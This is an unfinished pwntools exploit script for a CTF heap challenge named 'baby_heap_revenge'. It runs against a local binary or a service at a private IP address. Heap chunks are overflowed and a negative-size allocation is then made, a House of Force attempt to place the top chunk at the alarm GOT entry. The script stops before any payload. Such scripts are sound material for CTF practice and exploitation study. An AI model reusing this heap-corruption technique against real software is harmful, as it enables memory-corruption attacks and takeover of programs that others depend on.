#!/usr/bin/env python 
from pwn import *

LOCAL  = True
Debug  = True
SERVER = '172.16.113.50'
PORT   = 12039
Binary = 'baby_heap_revenge'

lib = ELF('./libc.so.6')

      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote(SERVER, PORT)
else:
    r = process('./{}'.format(Binary))
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')


"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
"""
def allocate(size,data):
    r.sendlineafter('choice:', '1')
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)
    
def show(index):
    r.sendlineafter('choice :', '2')

def exit():
    r.sendlineafter('choice :', '3')

if __name__ == "__main__":
   
   allocate(24,'\xff'*24)  
   allocate(24,'\xff'*24)  
   allocate(24,'\xff'*32) 
   
   # suppose aslr is down
   # alarm 0x601fc8 = new top 
   # old top = 0x603020
   # nb = 0x601fc8-0x603060-0x10

#   a = raw_input('wait')   
   #r.interactive()
   allocate(-4264,'\xff')
   
   a = raw_input('wait')
   
   r.interactive()
   

